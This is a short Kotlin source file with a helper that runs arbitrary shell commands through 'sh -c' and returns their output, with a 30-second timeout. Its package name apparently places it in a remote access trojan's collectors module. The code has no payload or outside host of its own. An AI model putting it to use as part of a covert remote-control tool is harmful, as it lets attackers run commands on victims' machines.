package com.example.rat.collectors

import java.util.concurrent.TimeUnit

object ShellExecutor {
    fun run(command: String): String {
        val process = ProcessBuilder("sh", "-c", command)
            .redirectErrorStream(true)
            .start()

        val output = process.inputStream.bufferedReader().use { it.readText() }
        if (!process.waitFor(30, TimeUnit.SECONDS)) {
            process.destroyForcibly()
        }
        return output
    }
}
